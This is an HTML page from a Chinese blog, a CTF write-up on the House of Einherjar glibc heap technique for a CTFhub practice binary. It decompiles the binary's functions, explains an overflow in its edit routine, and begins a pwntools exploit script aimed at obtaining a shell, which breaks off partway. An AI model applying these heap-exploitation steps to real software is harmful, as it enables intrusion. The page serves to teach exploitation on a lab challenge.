@@ -1,0 +1,753 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="keywords" content="downbeat">
+    
+    <meta name="author" content="D0wnBe@t">
+    <!-- preconnect -->
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+
+    
+        
+        
+        
+            <link rel="preconnect" href="https://evan.beee.top" crossorigin>
+        
+    
+    <!--- Seo Part-->
+    
+    <link rel="canonical" href="http://downbeat.top/2025/03/10/house-of-einherjar/"/>
+    <meta name="robots" content="index,follow">
+    <meta name="googlebot" content="index,follow">
+    <meta name="revisit-after" content="1 days">
+    
+        <meta name="description" content="前引前置知识可以参考我在notion做的笔记：https:&#x2F;&#x2F;plastic-tire-e58.notion.site&#x2F;House-of-Einherjar-1a9ca45ea8a4803d9d87fda6b6413462  这里就讲例题，建议先看前置知识 例题CTFhub上的house of Einherjar，只打了本地，题目附件：链接: https:&#x2F;&#x2F;pan.baidu.com&#x2F;s&#x2F;1GC">
+<meta property="og:type" content="article">
+<meta property="og:title" content="House_of_Einherjar">
+<meta property="og:url" content="http://downbeat.top/2025/03/10/House-of-Einherjar/index.html">
+<meta property="og:site_name" content="D0wnBe@t">
+<meta property="og:description" content="前引前置知识可以参考我在notion做的笔记：https:&#x2F;&#x2F;plastic-tire-e58.notion.site&#x2F;House-of-Einherjar-1a9ca45ea8a4803d9d87fda6b6413462  这里就讲例题，建议先看前置知识 例题CTFhub上的house of Einherjar，只打了本地，题目附件：链接: https:&#x2F;&#x2F;pan.baidu.com&#x2F;s&#x2F;1GC">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://downbeat.top/image-20250310201636721.png">
+<meta property="og:image" content="http://downbeat.top/image-20250310201855549.png">
+<meta property="og:image" content="http://downbeat.top/image-20250310202329091.png">
+<meta property="og:image" content="http://downbeat.top/image-20250310202358528.png">
+<meta property="og:image" content="http://downbeat.top/image-20250310202643145.png">
+<meta property="article:published_time" content="2025-03-10T11:35:01.000Z">
+<meta property="article:modified_time" content="2025-03-10T13:35:48.155Z">
+<meta property="article:author" content="downbeat">
+<meta property="article:tag" content="pwn">
+<meta property="article:tag" content="House_of_Einherjar">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://downbeat.top/image-20250310201636721.png">
+    
+    
+    <!--- Icon Part-->
+    <link rel="icon" type="image/png" href="/images/favicon.png" sizes="192x192">
+    <link rel="apple-touch-icon" sizes="180x180" href="/images/favicon.png">
+    <meta name="theme-color" content="#A31F34">
+    <link rel="shortcut icon" href="/images/favicon.png">
+    <!--- Page Info-->
+    
+    <title>
+        
+            House_of_Einherjar | D0wnBe@t
+        
+    </title>
+
+    <link rel="stylesheet" href="https://evan.beee.top/projects/hexo-theme-redefine@2.7.3/source/fonts/Chillax/chillax.css">
+
+    <!--- Inject Part-->
+    
+
+    
+<link rel="stylesheet" href="/css/style.css">
+
+
+    
+        <link rel="stylesheet" href="https://evan.beee.top/projects/hexo-theme-redefine@2.7.3/source/assets/build/styles.css">
+    
+
+    <link rel="stylesheet" href="https://evan.beee.top/projects/hexo-theme-redefine@2.7.3/source/fonts/GeistMono/geist-mono.css">
+    <link rel="stylesheet" href="https://evan.beee.top/projects/hexo-theme-redefine@2.7.3/source/fonts/Geist/geist.css">
+    <!--- Font Part-->
+    
+    
+    
+        <link href="" rel="stylesheet">
+    
+    
+    
+    
+
+    <script id="hexo-configurations">
+    window.config = {"hostname":"downbeat.top","root":"/","language":"zh-CN","path":"search.xml"};
+    window.theme = {"articles":{"style":{"font_size":"16px","line_height":1.5,"image_border_radius":"14px","image_alignment":"center","image_caption":false,"link_icon":true,"title_alignment":"left","headings_top_spacing":{"h1":"3.2rem","h2":"2.4rem","h3":"1.9rem","h4":"1.6rem","h5":"1.4rem","h6":"1.3rem"}},"word_count":{"enable":true,"count":true,"min2read":true},"author_label":{"enable":true,"auto":false,"list":[]},"code_block":{"copy":true,"style":"mac","highlight_theme":{"light":"github","dark":"vs2015"},"font":{"enable":false,"family":null,"url":null}},"toc":{"enable":true,"max_depth":3,"number":false,"expand":true,"init_open":true},"copyright":{"enable":true,"default":"cc_by_nc_sa"},"lazyload":true,"recommendation":{"enable":false,"title":"推荐阅读","limit":3,"mobile_limit":2,"placeholder":"/images/wallhaven-wqery6-light.webp","skip_dirs":[]}},"colors":{"primary":"#A31F34","secondary":null,"default_mode":"light"},"global":{"fonts":{"chinese":{"enable":true,"family":null,"url":null},"english":{"enable":false,"family":null,"url":null},"title":{"enable":false,"family":null,"url":null}},"content_max_width":"1000px","sidebar_width":"300px","hover":{"shadow":true,"scale":false},"scroll_progress":{"bar":false,"percentage":true},"website_counter":{"url":"https://cn.vercount.one/js","enable":true,"site_pv":true,"site_uv":true,"post_pv":true},"single_page":true,"preloader":{"enable":false,"custom_message":null},"open_graph":true,"google_analytics":{"enable":false,"id":null}},"home_banner":{"enable":true,"style":"fixed","image":{"light":"/images/Linux-user-Room.png","dark":"/images/wallhaven-wqery6-dark.webp"},"title":"Dream of Full Stack","subtitle":{"text":["keep going"],"hitokoto":{"enable":false,"show_author":false,"api":"https://v1.hitokoto.cn"},"typing_speed":100,"backing_speed":80,"starting_delay":500,"backing_delay":1500,"loop":true,"smart_backspace":true},"text_color":{"light":"#fff","dark":"#d1d1b6"},"text_style":{"title_size":"2.8rem","subtitle_size":"1.5rem","line_height":1.2},"custom_font":{"enable":false,"family":null,"url":null},"social_links":{"enable":false,"style":"default","links":{"github":null,"instagram":null,"zhihu":null,"twitter":null,"email":null},"qrs":{"weixin":null}}},"plugins":{"feed":{"enable":false},"aplayer":{"enable":false,"type":"fixed","audios":[{"name":null,"artist":null,"url":null,"cover":null,"lrc":null}]},"mermaid":{"enable":false,"version":"9.3.0"}},"version":"2.7.3","navbar":{"auto_hide":false,"color":{"left":"#f78736","right":"#367df7","transparency":35},"width":{"home":"1200px","pages":"1000px"},"search":{"enable":true,"preload":true}},"page_templates":{"friends_column":2,"tags_style":"blur"},"home":{"sidebar":{"enable":true,"position":"left","first_item":"menu","announcement":null,"show_on_mobile":true,"links":null},"article_date_format":"auto","excerpt_length":200,"categories":{"enable":true,"limit":3},"tags":{"enable":true,"limit":3}},"footerStart":"2024/8/20 11:51:58"};
+    window.lang_ago = {"second":"%s 秒前","minute":"%s 分钟前","hour":"%s 小时前","day":"%s 天前","week":"%s 周前","month":"%s 个月前","year":"%s 年前"};
+    window.data = {"masonry":false};
+  </script>
+    
+    <!--- Fontawesome Part-->
+    <link rel="stylesheet" href="https://evan.beee.top/projects/hexo-theme-redefine@2.7.3/source/fontawesome/fontawesome.min.css">
+    <link rel="stylesheet" href="https://evan.beee.top/projects/hexo-theme-redefine@2.7.3/source/fontawesome/brands.min.css">
+    <link rel="stylesheet" href="https://evan.beee.top/projects/hexo-theme-redefine@2.7.3/source/fontawesome/solid.min.css">
+    <link rel="stylesheet" href="https://evan.beee.top/projects/hexo-theme-redefine@2.7.3/source/fontawesome/regular.min.css">
+    
+    
+    
+    
+<meta name="generator" content="Hexo 5.4.2"></head>
+
+
+<body>
+<div class="progress-bar-container">
+    
+
+    
+        <span class="pjax-progress-bar"></span>
+<!--        <span class="swup-progress-icon">-->
+<!--            <i class="fa-solid fa-circle-notch fa-spin"></i>-->
+<!--        </span>-->
+    
+</div>
+
+
+
+<main class="page-container" id="swup">
+
+    
+
+    <div class="main-content-container flex flex-col justify-between min-h-dvh">
+
+
+        <div class="main-content-header">
+            <header class="navbar-container px-6 md:px-12">
+    <div class="navbar-content transition-navbar ">
+        <div class="left">
+            
+            <a class="logo-title" href="/">
+                
+                D0wnBe@t
+                
+            </a>
+        </div>
+
+        <div class="right">
+            <!-- PC -->
+            <div class="desktop">
+                <ul class="navbar-list">
+                    
+                    
+                        <li class="navbar-item search search-popup-trigger">
+                            <i class="fa-solid fa-magnifying-glass"></i>
+                        </li>
+                    
+                </ul>
+            </div>
+            <!-- Mobile -->
+            <div class="mobile">
+                
+                    <div class="icon-item search search-popup-trigger"><i class="fa-solid fa-magnifying-glass"></i>
+                    </div>
+                
+                <div class="icon-item navbar-bar">
+                    <div class="navbar-bar-middle"></div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Mobile sheet -->
+    <div class="navbar-drawer h-dvh w-full absolute top-0 left-0 bg-background-color flex flex-col justify-between">
+        <ul class="drawer-navbar-list flex flex-col px-4 justify-center items-start">
+            
+
+            
+            
+        </ul>
+
+        <div class="statistics flex justify-around my-2.5">
+    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/tags">
+        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">29</div>
+        <div class="label text-third-text-color text-sm">标签</div>
+    </a>
+    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/categories">
+        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">0</div>
+        <div class="label text-third-text-color text-sm">分类</div>
+    </a>
+    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/archives">
+        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">49</div>
+        <div class="label text-third-text-color text-sm">文章</div>
+    </a>
+</div>
+    </div>
+
+    <div class="window-mask"></div>
+
+</header>
+
+
+        </div>
+
+        <div class="main-content-body">
+
+            
+
+            <div class="main-content">
+
+                
+                    <div class="post-page-container flex relative justify-between box-border w-full h-full">
+    <div class="article-content-container">
+
+        <div class="article-title relative w-full">
+            
+                <div class="w-full flex items-center pt-6 justify-start">
+                    <h1 class="article-title-regular text-second-text-color tracking-tight text-4xl md:text-6xl font-semibold px-2 sm:px-6 md:px-8 py-3">House_of_Einherjar</h1>
+                </div>
+            
+            </div>
+
+        
+            <div class="article-header flex flex-row gap-2 items-center px-2 sm:px-6 md:px-8">
+                <div class="avatar w-[46px] h-[46px] flex-shrink-0 rounded-medium border border-border-color p-[1px]">
+                    <img src="/images/avatar2.jpg">
+                </div>
+                <div class="info flex flex-col justify-between">
+                    <div class="author flex items-center">
+                        <span class="name text-default-text-color text-lg font-semibold">D0wnBe@t</span>
+                        
+                            <span class="author-label ml-1.5 text-xs px-2 py-0.5 rounded-small text-third-text-color border border-shadow-color-1">Lv4</span>
+                        
+                    </div>
+                    <div class="meta-info">
+                        <div class="article-meta-info">
+    <span class="article-date article-meta-item">
+        <i class="fa-regular fa-pen-fancy"></i>&nbsp;
+        <span class="desktop">2025-03-10 19:35:01</span>
+        <span class="mobile">2025-03-10 19:35:01</span>
+        <span class="hover-info">创建</span>
+    </span>
+    
+        <span class="article-date article-meta-item">
+            <i class="fa-regular fa-wrench"></i>&nbsp;
+            <span class="desktop">2025-03-10 21:35:48</span>
+            <span class="mobile">2025-03-10 21:35:48</span>
+            <span class="hover-info">更新</span>
+        </span>
+    
+
+    
+    
+        <span class="article-tags article-meta-item">
+            <i class="fa-regular fa-tags"></i>&nbsp;
+            <ul>
+                
+                    <li>
+                        <a href="/tags/pwn/">pwn</a>&nbsp;
+                    </li>
+                
+                    <li>
+                        | <a href="/tags/House-of-Einherjar/">House_of_Einherjar</a>&nbsp;
+                    </li>
+                
+            </ul>
+        </span>
+    
+
+    
+    
+        <span class="article-wordcount article-meta-item">
+            <i class="fa-regular fa-typewriter"></i>&nbsp;<span>1.9k 字</span>
+        </span>
+    
+    
+        <span class="article-min2read article-meta-item">
+            <i class="fa-regular fa-clock"></i>&nbsp;<span>9 分钟</span>
+        </span>
+    
+    
+        <span class="article-pv article-meta-item">
+            <i class="fa-regular fa-eye"></i>&nbsp;<span id="busuanzi_value_page_pv"></span>
+        </span>
+    
+</div>
+
+                    </div>
+                </div>
+            </div>
+        
+
+        
+
+
+        <div class="article-content markdown-body px-2 sm:px-6 md:px-8 pb-8">
+            <h1 id="前引"><a href="#前引" class="headerlink" title="前引"></a>前引</h1><p>前置知识可以参考我在notion做的笔记：<a class="link" target="_blank" rel="noopener" href="https://plastic-tire-e58.notion.site/House-of-Einherjar-1a9ca45ea8a4803d9d87fda6b6413462">https://plastic-tire-e58.notion.site/House-of-Einherjar-1a9ca45ea8a4803d9d87fda6b6413462 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
+<p>这里就讲例题，建议先看前置知识</p>
+<h1 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h1><p>CTFhub上的house of Einherjar，只打了本地，题目附件：<br>链接: <a class="link" target="_blank" rel="noopener" href="https://pan.baidu.com/s/1GCWm8ygbHHSN5glmPbGXTg?pwd=down">https://pan.baidu.com/s/1GCWm8ygbHHSN5glmPbGXTg?pwd=down <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> 提取码: down </p>
+<p>建议先patchelf，用的是Glibc2.23-0ubuntu11.3_amd64</p>
+<h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>首页还是一个简单堆，来看看各个部分在干什么</p>
+<ul>
+<li>add</li>
+</ul>
+<p>这个地方漏洞点还是很明显的，没有对输入的size进行检查，而且还可以申请很多chunk</p>
+<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">add</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> result; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">int</span> v1; <span class="comment">// [rsp+Ch] [rbp-14h] BYREF</span></span><br><span class="line">  <span class="type">int</span> v2; <span class="comment">// [rsp+10h] [rbp-10h] BYREF</span></span><br><span class="line">  <span class="type">int</span> v3; <span class="comment">// [rsp+14h] [rbp-Ch]</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v4; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v4 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Give me a book ID: &quot;</span>);</span><br><span class="line">  __isoc99_scanf(&amp;unk_10C8, &amp;v2);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;how long: &quot;</span>);</span><br><span class="line">  __isoc99_scanf(&amp;unk_10C8, &amp;v1);</span><br><span class="line">  result = v2;</span><br><span class="line">  <span class="keyword">if</span> ( v2 &gt;= <span class="number">0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    result = v2;</span><br><span class="line">    <span class="keyword">if</span> ( v2 &lt;= <span class="number">0x31</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( v1 &lt; <span class="number">0</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;too large!&quot;</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        v3 = v2;</span><br><span class="line">        chunk[v3] = <span class="built_in">malloc</span>(v1); <span class="comment">// size没有检查</span></span><br><span class="line">        size[v3] = v1;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;Done!\n&quot;</span>);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+
+<ul>
+<li>delete</li>
+</ul>
+<p>对free掉的指针进行了清零，所以我们不能用UAF了</p>
+<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">__int64 <span class="title function_">delete</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v1; <span class="comment">// [rsp+0h] [rbp-10h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v3; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v3 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  v1 = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Which one to throw?&quot;</span>);</span><br><span class="line">  __isoc99_scanf(&amp;unk_10C8, &amp;v1);</span><br><span class="line">  <span class="keyword">if</span> ( v1 &lt;= <span class="number">0x32</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">free</span>(chunk[v1]);</span><br><span class="line">    chunk[v1] = <span class="number">0LL</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;Done!\n&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;Wrong!\n&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+
+<ul>
+<li>show</li>
+</ul>
+<p>就是正常的输出，可以泄露libc</p>
+<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 <span class="title function_">show</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v1; <span class="comment">// [rsp+4h] [rbp-Ch] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v2; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v2 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Which book do you want to show?&quot;</span>);</span><br><span class="line">  __isoc99_scanf(&amp;unk_10C8, &amp;v1);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Content: %s&quot;</span>, chunk[v1]);</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+
+<ul>
+<li>edit</li>
+</ul>
+<p>一眼就可以看到有个off by one，但是仔细观察可以发现，v2的取值依赖于上一次进入该函数的chunk的size，也就是说，只要上一个进入该函数的chunk的size比现在进入该函数的chunk的size大，那么就可以造成堆溢出，任意改内容，off  by one的漏洞其实就被忽略了，因为我们实际溢出的范围大多了。</p>
+<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">edit</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v1; <span class="comment">// [rsp+0h] [rbp-10h] BYREF</span></span><br><span class="line">  <span class="type">int</span> v2; <span class="comment">// [rsp+4h] [rbp-Ch]</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v3; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v3 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  v2 = size[v1]; <span class="comment">// 用的是上一次进入该函数的chunk的size</span></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Which book to write?&quot;</span>);</span><br><span class="line">  __isoc99_scanf(&amp;unk_10C8, &amp;v1);</span><br><span class="line">  <span class="keyword">if</span> ( chunk[v1] )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Content: &quot;</span>);</span><br><span class="line">    read(<span class="number">0</span>, chunk[v1], (v2 + <span class="number">1</span>)); <span class="comment">// off by one</span></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;Done!\n&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;wrong!&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+
+<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>漏洞点其实还是很明显的，在edit函数里面，只要上一个进入该函数的chunk的size较大，那么我们就可以造成堆溢出，而且edit函数还可以无限次利用，很爽🥰🥰。</p>
+<p>即使题目不能用UAF，但是我们还是可以溢出改写freechunk，因此该题目其实有两种方法</p>
+<p><code>house of orange</code> 和<code>house of Einherjar</code>，下面都讲一下：</p>
+<h2 id="house-of-orange"><a href="#house-of-orange" class="headerlink" title="house of orange"></a>house of orange</h2><p>可以参考这篇文章先：<a href="http://downbeat.top/2025/03/07/2024ciscn-PWN%E5%A4%8D%E7%8E%B0/">http://downbeat.top/2025/03/07/2024ciscn-PWN%E5%A4%8D%E7%8E%B0/</a></p>
+<p>这题目的手法可以说一模一样，区别于最后调用ogg那里要结合realloc改一改</p>
+<p>由于我们任意改的前提是上一次进入edit的chunk的size要大于当前的chunk的size，那么我们可以一直利用edit来实现我们想要写入的size，下面直接见EXP吧(关于realloc在EXP后面说)：</p>
+<h3 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h3><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">bug</span>():</span><br><span class="line">    gdb.attach(p)</span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_addr</span>():</span><br><span class="line">    <span class="keyword">return</span> u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_sb</span>():</span><br><span class="line">    <span class="keyword">return</span> libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>], libc_base + <span class="built_in">next</span>(libc.search(<span class="string">b&#x27;/bin/sh\x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">ia</span>():</span><br><span class="line">        p.interactive()</span><br><span class="line"></span><br><span class="line">sd = <span class="keyword">lambda</span> data : p.send(data)</span><br><span class="line">sa  = <span class="keyword">lambda</span> text,data  :p.sendafter(text, data)</span><br><span class="line">sl  = <span class="keyword">lambda</span> data   :p.sendline(data)</span><br><span class="line">sla = <span class="keyword">lambda</span> text,data  :p.sendlineafter(text, data)</span><br><span class="line">rc   = <span class="keyword">lambda</span> num=<span class="number">4096</span>   :p.recv(num)</span><br><span class="line">ru  = <span class="keyword">lambda</span> text   :p.recvuntil(text)</span><br><span class="line">rl  = <span class="keyword">lambda</span>    :p.recvline()</span><br><span class="line">pr = <span class="keyword">lambda</span> num=<span class="number">4096</span> :<span class="built_in">print</span>(p.recv(num))</span><br><span class="line">l32 = <span class="keyword">lambda</span>    :u32(p.recvuntil(<span class="string">b&#x27;\xf7&#x27;</span>)[-<span class="number">4</span>:].ljust(<span class="number">4</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">l64 = <span class="keyword">lambda</span>    :u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">uu32    = <span class="keyword">lambda</span>    :u32(p.recv(<span class="number">4</span>).ljust(<span class="number">4</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">uu64    = <span class="keyword">lambda</span>    :u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">int16   = <span class="keyword">lambda</span> data   :<span class="built_in">int</span>(data,<span class="number">16</span>)</span><br><span class="line">lg= <span class="keyword">lambda</span> s, num   :p.success(<span class="string">&#x27;%s -&gt; 0x%x&#x27;</span> % (s, num))</span><br><span class="line"></span><br><span class="line">context(arch = <span class="string">&quot;amd64&quot;</span>,os = <span class="string">&quot;linux&quot;</span>,log_level = <span class="string">&quot;debug&quot;</span>)</span><br><span class="line"><span class="comment">#context.terminal = [&#x27;tmux&#x27;,&#x27;splitw&#x27;,&#x27;-h&#x27;]</span></span><br><span class="line"><span class="comment">#context.terminal = [&#x27;gnome-terminal&#x27;, &#x27;-x&#x27;, &#x27;sh&#x27;, &#x27;-c&#x27;]</span></span><br><span class="line">context.terminal=[<span class="string">&quot;cmd.exe&quot;</span>,<span class="string">&quot;/c&quot;</span>, <span class="string">&quot;start&quot;</span>, <span class="string">&quot;cmd.exe&quot;</span>, <span class="string">&quot;/c&quot;</span>, <span class="string">&quot;wsl.exe&quot;</span>, <span class="string">&quot;-e&quot;</span>] <span class="comment"># wsl</span></span><br><span class="line">file = <span class="string">&quot;./pwn&quot;</span></span><br><span class="line">libc = <span class="string">&quot;/home/downbeat/tools/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64//libc.so.6&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p = process(file)</span><br><span class="line">elf = ELF(file)</span><br><span class="line">libc = ELF(libc)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">choice</span>(<span class="params">idx</span>):</span><br><span class="line">    sla(<span class="string">&quot;Your choice: &quot;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title 